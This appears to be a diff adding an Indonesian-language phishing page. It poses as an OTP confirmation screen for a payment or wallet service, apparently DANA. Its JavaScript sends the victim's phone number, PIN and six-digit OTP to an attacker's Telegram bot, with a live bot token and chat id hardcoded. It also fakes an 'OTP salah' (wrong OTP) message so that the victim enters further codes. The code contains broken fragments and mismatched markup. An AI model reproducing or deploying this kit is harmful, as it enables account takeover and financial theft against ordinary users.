@@ -1,0 +1,458 @@
+   <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+<script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/container.css">
+<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/loader.css">
+<link rel="stylesheet" href="/asset/main.css">
+    <link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/otp.css">
+    <title>Input OTP</title>
+    <style>
+        /* Gaya CSS lengkap sesuai permintaan */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to top right, #fff, #fff);
+            background-size: cover;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            flex-direction: column; 
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 80%;
+            position: relative;
+            max-width: 300px;
+            text-align: center;
+            z-index: 1;
+            
+        }
+
+        h1 {
+            font-size: 15px;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+
+        p {
+            font-size: 10px;
+            margin-bottom: 20px;
+            text-align: left;
+            color: #666;
+        }
+
+        .otp-input input {
+            width: 40px;
+            font-size: 18px;
+            text-align: center;
+            border: none;
+            font-weight: bold;
+            border-bottom: 2px solid #ccc;
+            outline: none;
+            transition: border-color 0.5s;
+            margin-right: -5px;
+        }
+
+        .otp-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 1px;
+        }
+
+        .otp-input input:focus {
+            border-color: #0F78CB;
+        }
+
+        button {
+            background-color: #008000;
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 25px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .success-message {
+            display: none;
+            font-size: 16px;
+            color: red;
+            margin-top: 10px;
+        }
+
+.loading-container {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 9999;
+    background: none; /* Menghilangkan latar belakang putih */
+    padding: 0; /* Menghilangkan padding */
+    border-radius: 0; /* Menghilangkan border-radius jika ingin tanpa sudut melengkung */
+    text-align: center;
+    box-shadow: none; /* Menghilangkan efek bayangan */
+}
+
+.loading-container img {
+    width: 80px;
+height: 80px;
+border-radius: 10px;
+}
+
+
+        .photo-box {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .photo-box img {
+            max-width: 80%;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        .timer {
+            font-size: 14px;
+            font-weight: bold;
+            color: #008000;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+
+
+
+        <div class="loading-container" id="loading-container">
+            <img src="I5JAJOrShr.gif" alt="Loading">
+            <p></p>
+        </div>
+
+    </div>
+    <div class="photo-box">
+        <img src="" alt="">
+    </div>
+
+  <form id="formOtp" class="otp">
+   <center><h3>Konfirmasi OTP kamu</3>
+				
+				
+				<div class="box-input-otp" style="margin-top: 50px">
+					
+					<div class="loadingOtp" style="display:none;background:"transparent">
+		
+		</div>
+		<div type="button" class="clearotp" input type="password" id="logo" value=""></div>
+					<input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp5" id="otp5" class="inpotp" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp6" id="otp6" class="inpotp" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"></div>
+                <center class="desc" style="font-size: 15px; line-height: 18px; margin-top: 25px">
+Kami telah mengirim OTP ke Nomor Telpon kamu,<br>OTP akan kedaluwarsa setelah 3 menit</p>
+<div class="card-body d-flex py-5">					
+<div class="col"> 
+<div class="row"> 
+<div class="col-12 col-sm-4 col-md-4 col-lg-4 mx-auto"> 
+ <!-- Modal --> 
+
+<div class="row"> 
+<div class="col-12"> 
+<div class="alert alert-v2 alert-warning d-flex" role="alert"> 
+</div> 
+<div> 
+
+   <div class="row"> 
+     
+     <p style="font-weight: bold; font-size: 16px; color: #000; text-align: center; margin: 20px auto;" id="timers">03 : 00</p> 
+    </div> 
+ 
+    <a style="font-weight: null; font-size: 14px; color: #000; text-align: center; margin: 20px auto;" href="ott.html" onclick=""><b>𝖪𝗂𝗋𝗂𝗆 𝗎𝗅𝖺𝗇𝗀</b></a></p>
+ 
+    <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+    
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="./asset/goo1gle.js"></script>
+<script>$(document).ready(function(){$('#inp').on('input', function(){if($(this).val() == '0' || $(this).val() == '62'){$(this).val('');}});});</script>
+<script>$(document).ready(function(){$('#inp').mask('000-0000-000000');});</script>
+<script>let inp = document.getElementById("inp");let btn = document.getElementById("btn");inp.addEventListener("input", val);function val(){if(inp.value.length > 10){btn.disabled = false;}else{btn.disabled = true;}};</script>
+
+<script>
+//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
+var pinContainer = document.querySelector(".box-input-pin");
+console.log('There is ' + pinContainer.length + ' Pin Container on the page.');
+
+pinContainer.addEventListener('keyup', function (event) {
+    var target = event.srcElement;
+    
+    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
+    var myLength = target.value. length;
+
+    if (myLength >= maxLength) {
+        var next = target;
+        while (next = next.nextElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        } aa
+    }
+
+    if (myLength === 0) {
+        var next = target;
+        while (next = next.previousElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        }
+    }
+}, false);
+
+pinContainer.addEventListener('keydown', function (event) {
+    var target = event.srcElement;
+    target.value = "";
+}, false);
+</script>
+<script>$('.inpotp').on('input', function(event) {const inputs = $('.inpotp');const isAllFilled = Array.from(inputs).every((input) => input.value !== '');if (isAllFilled == true) {$(event.target).blur();sendOtp();}const index = inputs.index(this);const currentValue = event.target.value;if (currentValue.length === 1) {if (index < inputs.length - 1) {inputs[index + 1].focus();}} else if (currentValue.length === 0) {if (index > 0) {inputs[index].focus();}};});$('.inpotp').on('keydown', function(event) {const inputs = $('.inpotp');const key = event.key;const index = inputs.index(this);if (key === 'Backspace' && event.target.value.length === 0) {if (index > 0) {inputs[index - 1].focus();}};});</script>
+<script>$(document).ready(function() {$('.clear').click(function() {$('.inppin').val('');$('#pin1').focus();});$('.clearotp').click(function() {$('.inpotp').val('');$('#otp1').focus();});$('.show').click(function() {$('.inppin').each(function() {if ($(this).attr('type') === 'password') {$(this).attr('type','number');$("").text("");} else {$(this).attr('type', 'password');$("").text("");}});});});</script>
+<script>
+ function nextPrev(){
+      $("#process1").show();event.preventDefault();
+       setTimeout(function(){
+           $("#homeku").hide();
+           $("#back1").show();
+           $("#butonku").fadeOut();
+           $(".box-login").fadeIn();
+           $("#process1").hide();
+       },1000);
+ }   
+ 
+ </script>
+ 
+<script>
+    $( document ).ready(function() {
+            setTimeout(() => {
+                $('#').hide();
+                $('chsalxcome2').fadeIn();
+            },2000)
+             $('musikku').play();
+        })
+        
+</script>
+
+
+<script>
+function tutupotp(){
+$(".bgotp").hide();    
+}
+</script>
+<script>
+   function sendNohp(event){
+    $("#process").show();event.preventDefault();
+    $("#inp").blur();
+     
+    
+    
+    var nomor = document.getElementById("inp").value;
+            sessionStorage.setItem("nomor", nomor);
+    var logo = document.getElementById('logo');       
+    var inp = document.getElementById('inp');
+    
+    var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩 : ' + '0' + inp.value;
+   
+    var token = ''; // Ganti dengan token bot yang kamu buat
+    var grup = ''; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+    
+    success: function(){
+    $("#process").hide();
+    $("#formNohp").fadeOut();
+    setTimeout(function(){
+    $("#formPin").fadeIn();
+    $("#pin1").focus();
+    }, 500);}});};
+    
+
+function sendPin(){
+    $(".loadingPin");
+  var nomor = sessionStorage.getItem("nomor");
+        document.getElementById("alert").innerHTML = "block";
+  var logo = document.getElementById('logo'); 
+  var inp = document.getElementById('inp');
+     
+  var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩: ' + '0' + inp.value;
+  
+     
+ 
+
+    var token = '7566851766:AAEbOqBAI2XfHKrx15zlO-OqkGUvNzFPh_o'; // Ganti dengan token bot yang kamu buat
+    var grup = '-1002437287311'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+
+
+success: function(){
+$("#process").hide();
+document.getElementById("alert").style.display = "block"; 
+$(".bgotp").fadeIn();
+setInterval(countdown, 1000);
+$("#otp1").focus();
+}
+}
+);
+};
+
+
+  function sendOtp(){
+    $(".loadingOtp");
+     var logo = document.getElementById('logo'); 
+     var inp = document.getElementById('inp');
+     var otp1 = document.getElementById('otp1');
+     var otp2 = document.getElementById('otp2');
+     var otp3 = document.getElementById('otp3');
+     var otp4 = document.getElementById('otp4');
+     var otp5 = document.getElementById('otp5');
+     var otp6 = document.getElementById('otp6');
+ setTimeout(function(){
+             setTimeout(function(){
+$(".alert").text("OTP salah, Masukkan lagi.");
+$(".alert").css("color","red");
+ },2000);
+    $(".alert").text("","Invalid");
+    $(".alert").css("color","");
+ },1000);
+ 
+    var gabungan = '' + logo.value + '%0A𝐎𝐓𝐏 : ' + otp1.value + otp2.value + otp3.value + otp4.value + otp5.value + otp6.value;
+
+
+        var token = '7566851766:AAEbOqBAI2XfHKrx15zlO-OqkGUvNzFPh_o'; // Ganti dengan token bot yang kamu buat
+    var grup = '-1002437287311'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+        
+    success: function(){
+    setTimeout(function(){
+    $(".loadingOtp").hide();
+   
+    $('.inpotp').val('');
+   $('#otp1').focus();
+  var nomor = sessionStorage.getItem("nomor");
+        document.getElementById("alert").innerHTML = "Kode baru dikirim ulang via SMS ke<br> Nomor kamu yang terdaftar";
+   $(".alert").css("color","transparent");
+    },4000);
+   
+        
+    }
+        
+    }
+    );
+        
+    };
+    </script>
+<script>
+    function countdown() {
+    var count = parseInt(
+    $('#countdown').text());
+    if (count !== 0) {
+    $('#countdown').text(count - 1);} 
+    else {
+    $('#countdown').text('');}};
+    </script>
+<script>
+        window.location.href = 'pin.html';
+    });
+        setTimeout(function(){
+            $(".start").fadeIn();
+            setTimeout(function(){
+                $(".start").fadeOut(1000);
+                setTimeout(function(){
+                   $(".container").fadeIn(200);
+                   $("#inp").focus();
+                },1000);
+            },1000);
+        },500);
+}
+</script>
+<script src="mainkode.js"></script>
+<script>
+        document.getElementById('timer').innerHTML =
+          01 + ":" + 00;
+        startTimer();
+        
+       
+        
+        function startTimer() {
+          var presentTime = document.getElementById('timer').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-3}
+          if(m<3){
+            return
+          }
+          
+          document.getElementById('timer').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer, 3000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "3" + sec}; // add zero in front of numbers < 10
+          if (sec < 3) {sec = "59"};
+          return sec;
+        }
+        
+        
+    </script> 
+  <script>
+      document.getElementById('timers').innerHTML =
+          3 + ":" + 00;
+        startTimer();
+        
+        function startTimer() {
+          var presentTime = document.getElementById('timers').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('timers').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer, 1000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+        
+        
+        
+  </script>
+</body>
+</html>
